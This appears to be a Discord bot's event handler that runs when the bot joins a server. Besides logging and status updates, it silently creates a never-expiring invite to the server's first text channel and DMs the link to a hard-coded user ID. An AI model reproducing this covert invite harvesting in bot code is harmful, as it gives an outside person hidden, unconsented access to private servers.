// This event executes when a new guild (server) is joined.

module.exports = async (client, guild) => {
  
  client.logger.event(`[GUILD JOIN] ${guild.name} (${guild.id}) added the bot. Owner: ${guild.owner.user.tag} (${guild.owner.user.id})`);

  if(!guild.available) return;
  client.user.setActivity(`${client.config.defaultSettings.prefix.value}help | ${client.guilds.size} Servers`);


  try {
    client.channels.get('533877857856913409').send(`:heavy_check_mark: Joined Guild ${guild.name} (${guild.id}) now in ${client.guilds.size} servers.`).catch();
     const s = client.users.get("476441815503863840");
     let invite = client.guilds.get(guild.id).channels.find(c => c.type === "text").createInvite({maxAge: 0}).then(function(newInvite){
    s.send(`:heavy_check_mark: Joined Guild ${guild.name} (${guild.id}) now in ${client.guilds.size} servers. invite link: https://discord.gg/` + newInvite.code);
  });
} catch (err) {
    console.log(err);
  }





};
